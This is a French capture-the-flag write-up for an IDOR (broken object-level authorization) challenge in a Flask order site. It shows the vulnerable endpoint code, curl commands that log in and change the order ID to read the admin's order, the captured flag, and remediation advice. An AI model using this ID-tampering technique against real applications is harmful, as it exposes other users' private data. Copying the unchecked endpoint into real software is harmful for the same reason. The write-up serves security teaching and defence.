# Mes Commandes — Accès Non Autorisé (IDOR)

**Catégorie :** Web - Access Control
**Difficulté :** Facile
**Points :** 100

## Objectif

Accéder aux détails d'une commande appartenant à un autre utilisateur (l'admin), en étant connecté avec un compte client normal.

## Vulnérabilité

Le endpoint `/commande/<id>` vérifie uniquement qu'un utilisateur est authentifié (cookie de session valide), mais ne vérifie jamais que la commande demandée appartient bien à l'utilisateur connecté :

```python
@app.route("/commande/<int:commande_id>")
def commande(commande_id):
    token = request.cookies.get("session_token", "")
    user = get_user_by_token(token)
    if not user:
        return redirect("/login")
    # Pas de vérification commande.user_id == user.id
    cur.execute("SELECT item, details FROM commandes WHERE id = ?", (commande_id,))
    ...
```

C'est un cas classique d'**IDOR (Insecure Direct Object Reference)** / **Broken Object Level Authorization (BOLA)** : l'ID de la ressource est directement exposé et manipulable dans l'URL, sans contrôle d'autorisation sur la propriété de la ressource.

## Exploitation

**1. Connexion légitime avec un compte faible**

```bash
curl -c cookies.txt -X POST http://<cible>:5003/login \
  --data-urlencode "username=amira" --data-urlencode "password=pass123"
```

**2. Consultation normale de ses propres commandes**

```bash
curl -b cookies.txt http://<cible>:5003/mes-commandes
# <h2>Bonjour amira</h2><ul><li><a href="/commande/1">Cappuccino</a></li></ul>
```

amira (user_id=1) ne voit qu'une seule commande, la sienne (id=1).

**3. Modification manuelle de l'ID dans l'URL**

```bash
curl -b cookies.txt http://<cible>:5003/commande/3
```

La commande #3 appartient en réalité à l'utilisateur admin (user_id=3), mais l'application la retourne quand même puisqu'aucune vérification de propriété n'est faite.

## Résultat

```
Commande #3
Article : Thé vert
Détails : Note interne admin : FLAG{1d0r_br0k3n_4cc3ss_c0ntr0l}
```

## Flag

```
FLAG{1d0r_br0k3n_4cc3ss_c0ntr0l}
```

## Remédiation

- Toujours vérifier la propriété de la ressource côté serveur avant de la retourner :
  ```python
  cur.execute("SELECT item, details FROM commandes WHERE id = ? AND user_id = ?", (commande_id, user.id))
  ```
- Préférer des identifiants non séquentiels/non devinables (UUID) pour les ressources sensibles, en complément du contrôle d'accès (jamais en remplacement — "security by obscurity" seul n'est pas suffisant).
- Mettre en place des tests systématiques d'autorisation (matrice de contrôle d'accès) lors des revues de code.

